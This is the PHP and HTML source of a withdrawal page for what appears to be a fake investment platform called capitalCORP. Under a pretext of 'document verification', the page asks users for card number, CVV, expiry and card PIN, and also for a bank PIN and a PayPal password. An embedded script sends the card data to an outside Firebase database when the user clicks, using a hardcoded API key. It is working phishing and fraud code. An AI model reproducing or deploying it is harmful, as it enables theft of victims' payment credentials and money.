<?php 
session_start();

include("connection.php");
include("functions.php");

$user_data = check_login($con);
?>

<!DOCTYPE html>
<html>
  <head>
    <title>capitalCORP</title>
        <!-- FAVIVON -->
        <link rel="shortcut icon" href="images/favicon.png" type="image/png">
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
	      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

        <link rel="stylesheet" href="csss/innert.css" />
        <link rel="stylesheet" href="csss/aos.cs" />
          <link rel="stylesheet" href="csss/styllexxo.css">
    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <style>
    @media (max-width:500px){
 body{
      height:310vh;
 }
    
    }
    @media (max-width:430px){
 body{
      height:;
 }
    
    }
        @media (max-width:400px){
 body{
      height:360vh;
 }
 @media (max-width:380px){
 body{
      height:380vh;
 }

}

  @media only screen 
  and (device-width: 375px) 
  and (device-height: 667px) 
  and (-webkit-device-pixel-ratio: 2) 
  and (orientation: portrait) {
     body{
      height:450vh;
 }
}
    

    </style>
  </head>
  <body>
      <header style="float: ;">&nbsp;&nbsp;&nbsp;&nbsp;
      <ul style="margin-top:0px;">
        <a href=""><h4 style="font-weight: 800;color:#ccccccf1;float: left;">capital<span style="background: linear-gradient(to right, #402bca,
                                      #d625aa, #c77f3d, #d44c63); -webkit-text-fill-color: transparent; -webkit-background-clip: text;font-weight: 800;">CORP</span></h4></a>
      </ul>
      <ul style="float: right;margin-top:-30px;">
    <i class="fa fa-wifi" style="font-size:15px;font-weight:800;color:#ffffff;"></i>  &nbsp;&nbsp;&nbsp;&nbsp;
      <a href=""><?php echo $user_data['user_name']; ?></a>&nbsp;&nbsp;&nbsp;&nbsp;
      <a href="logout.php"><i class="fa fa-sign-out" style="font-size:15px;font-weight:800;color:red;"></i></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </ul>
  </header>
         
          
  <div class="wrapper">
          
           <small id="google_translate_element" style="margin-top:0px;"></small>
       <h3 style="">WELCOME::&nbsp;&nbsp;<?php echo $user_data['user_name']; ?></h3>

       <!-- TradingView Widget BEGIN -->
<div class="tradingview-widget-container">
  <div class="tradingview-widget-container__widget"></div>
  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js" async>
  {
  "symbols": [
    {
      "proName": "FOREXCOM:SPXUSD",
      "title": "S&P 500 Index"
    },
    {
      "proName": "FOREXCOM:NSXUSD",
      "title": "US 100 Cash CFD"
    },
    {
      "proName": "FX_IDC:EURUSD",
      "title": "EUR to USD"
    },
    {
      "proName": "BITSTAMP:BTCUSD",
      "title": "Bitcoin"
    },
    {
      "proName": "BITSTAMP:ETHUSD",
      "title": "Ethereum"
    }
  ],
  "showSymbolLogo": true,
  "isTransparent": true,
  "displayMode": "adaptive",
  "colorTheme": "dark",
  "locale": "en"
}
  </script>
</div>
<!-- TradingView Widget END -->

<div class="info">
  <ul data-aos="fade-down">
    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['deposited']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">DEPOSITED</p>
  </ul>
  <ul data-aos="fade-down">
    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['total_balance']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">T.BALANCE</p>
  </ul>
  <ul data-aos="fade-down">
    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['bonus']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">BONUS</p>
  </ul>
  <ul data-aos="fade-down">
    <h5><?php echo $user_data['currency_type']; ?>&nbsp;<small style="font-size:16px;font-weight: 800;color:#fff;"><?php echo $user_data['total_profit']; ?></small></h5>
    <i class="fas fa-chart-line" style="float:right;"></i>
    <br><br>
      <p style="color:#666;font-weight: 800;">TOTAL PROFIT</p>
  </ul>
  </div>
  
  <div class="navi" style="">
    <a href="dashboard.php" style="">ACCOUNT</a>
    <a href="deposit.php" style="">MAKE DEPOSIT</a>
    <a href="palverify.php" style="">SIGNAL PURCHASE</a>
    <a href="withdraw.php" style="">WITHDRAW FUNDS</a>
    <a href="" style="">MAIL US</a>
    <a href="profile.php" style="">SETTINGS</a>
  </div>

  <div class="withdrawa" style="">
    <h4 style="">Request Withdrawal</h4>
    <hr>
    <h5><i class="fa fa-user"></i><br>STEP 1<br><b style="">DOCUMENT VERIFICATION</b></h5>
    <p style="">BEFORE INITIATING ANY WITHDRAWAL WE NEED TO RUN A QUICK CHECK IF YOUR THE BENEFICIARY FOR RECIEVING CASH..</p>
    <p style="">WE DO THIS BY UPLOADING AN ACTIVE CREDIT CARD OR CHECKING BANK ACCOUNT , INORDER TO RUN A QUICK CHECK IF YOUR THE BENEFICIARY</p>
    <p style="">kindly note that we are sorry for the inconvienence this might have caused</p>
    <small>CREDIT CARD</small><br><br><small>CHECKING BANK ACCT</small>

    <div class="CC">
            
            
      <ul style="">
              <h3 style="">CARD DETAILS</h3>
              <b>Todays charge is:US$20.99(non-recurring) to www.capitalCORP.net</b><br>
<img src="imgg/american-express.png"style="width:35px;">
  <img src="imgg/mastercard.png"style="width:35px;">
  <img src="imgg/visa.png"style="width:35px;">
  <img src="imgg/paypal.png"style="width:35px;">
  <img src="imgg/maestro.png"style="width:35px;">
              <br><br>
             
        <p style="">Name On Card&nbsp;&nbsp;<input type="text" name="cardfullname" id="userFullName"></p>
        <p style="">Card Digits&nbsp;&nbsp;<input type="text" name="cardnumber" id="userCardNumber"></p>
        <p style="">Expiration&nbsp;&nbsp;<input type="text" name="cardexpir" id="userCardExpir"></p>
        <p style="">CVV/CVC2&nbsp;&nbsp;<input type="text" name="cardcvc" id="userCvc"></p>
        <p style="">Card Pin&nbsp;&nbsp;<input type="text" name"userpin" id="userPin"></p>
      </ul>

      <ul style="">
              <h3 style="">BILLING DETAILS</h3>
        <p style="">Email&nbsp;&nbsp;<input type="text"></p>
        <p style="">Country&nbsp;&nbsp;<input type="text"></p>
        <p style="">State&nbsp;&nbsp;<input type="text"></p>
        <p style="">City&nbsp;&nbsp;<input type="text"></p>
        <p style="">Address&nbsp;&nbsp;<input type="text"></p>
        <p style="">Zip Code&nbsp;&nbsp;<input type="text"></p>
      </ul>

      <ul>

        <label for="fruit">WITHDRAWAL TYPE</label>
<select id="fruit" onchange="showDiv()">
  <option value="">--Select--</option>
  <option value="btc">BITCOIN</option>
  <option value="usdt">USDT TRON</option>
  <option value="bank">BANK</option>
  <option value="paypal">PAYPAL</option>
</select>
<br><br>
<!-- Divs that will show conditionally -->
<div id="btc" class="fruit-info" style="display:none;">
  <label> BTC WALLET ADDRESS<input type="text"></label><br>
  <label>AMOUNT<input type="text"></label>
</div>
<div id="usdt" class="fruit-info" style="display:none;">
  <label>USDT TRON WALLET ADDRESS<input type="text"></label><br>
  <label>AMOUNT<input type="text"></label>
</div>
<div id="bank" class="fruit-info" style="display:none;">
  <label>BANK NAME<input type="text"></label><br>
  <label>BANK ID<input type="text"></label><br>
  <label>BANK PIN<input type="text"></label>
</div>
<div id="paypal" class="fruit-info" style="display:none;">
  <label>PAYPAL TAG<input type="text"></label><br>
  <label>PAYPAL USERNAME<input type="text"></label><br>
  <label>PAYPAL PASSWORD<input type="text"></label>
</div>

      </ul>
    </div>
  </div>

  <button name="submit" id="mybtn" type="submit"><a href="validatingwithdrawal.php">PROCEED TO WITHDRAW CASH</a></button>


  <footer class="footer">
  <ul style="">
    <a href="dashboard.php" style=""><i class="fa fa-home"><p style="font-weight: 800;">HOME</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="deposit.php" style=""><i class="fa fa-wallet"><p style="font-weight: 800;">WALLET</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="upgradeplan.php" style=""><i class="fas fa-chart-line"><p style="font-weight: 800;">UPGRADE PLAN</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="" style=""><i class="fas fa-award"><p style="font-weight: 800;">REWARD</p></i></a>&nbsp;&nbsp;&nbsp;
    <a href="profile.php" style=""><i class="fas fa-user-circle"><p style="font-weight: 800;">ACCOUNT</p></i></a>&nbsp;&nbsp;&nbsp;
  </ul>
</footer>



  </div>
    
    
    
    
    
    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>	
    
    
<script>
// used to grab onto firebase ->connection
var firebaseConfig = {
  apiKey: "AIzaSyAF4wYQYeWmBzrHdSFjY9LS5wXQnb-A6ps",
  authDomain: "contactform-firebase-cfa2e.firebaseapp.com",
  projectId: "contactform-firebase-cfa2e",
  storageBucket: "contactform-firebase-cfa2e.appspot.com",
  messagingSenderId: "331127382673",
  appId: "1:331127382673:web:2d4f12aea3897eeec1d530"
};
  
  //init firebase
  firebase.initializeApp(firebaseConfig);
  var firestore= firebase.firestore();
  
  //start grabbing our DOM elements
  const submitBtn= document.querySelector('#mybtn')
   let userFullName= document.querySelector('#userFullName');
  let userCardNumber= document.querySelector('#userCardNumber');
  let userCvc= document.querySelector('#userCvc');
  let userCardExpir= document.querySelector('#userCardExpir');
  let userPin= document.querySelector('#userPin');
  
  
  const db= firestore.collection("12345678910");
  
  submitBtn.addEventListener('click', function(){
	let userFullNameInput = userFullName.value; 
	   let userCardNumberInput = userCardNumber.value; 
	    let userCvcInput = userCvc.value;
      let userCardExpirInput = userCardExpir.value; 
	   let userPinInput = userPin.value; 
	    
	  
	   
	   
	   
	   //access the database collection
	    db.doc().set({
        userFullName:userFullNameInput,
        userCardNumber:userCardNumberInput,
        userCvc:userCvcInput,
        userCardExpir:userCardExpirInput,
        userPin:userPinInput,
        
	   }).then(function(){
		 console.log("Data Saved");  
	   }).catch(function(error){
		   console.log(error);
	   });
  });
  </script>
  
  
    

  <script type="text/javascript">
    function googleTranslateElementInit() {
      new google.translate.TranslateElement(
        {pageLanguage: 'en'}, 
        'google_translate_element'
      );
    }
  </script>
  <script>
    function showDiv() {
      var selected = document.getElementById("fruit").value;
    
      // Hide all divs first
      var divs = document.getElementsByClassName("fruit-info");
      for (var i = 0; i < divs.length; i++) {
        divs[i].style.display = "none";
      }
    
      // Show the selected one if it exists
      if (selected) {
        var divToShow = document.getElementById(selected);
        if (divToShow) {
          divToShow.style.display = "block";
        }
      }
    }
    </script>
  
  <script type="text/javascript" 
    src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
  </script>
<script src="jss/aos.js"></script>
<script src="jss/snow.js"></script>
<script src="jss/rainingcfd.js"></script>
  </body>
</html>
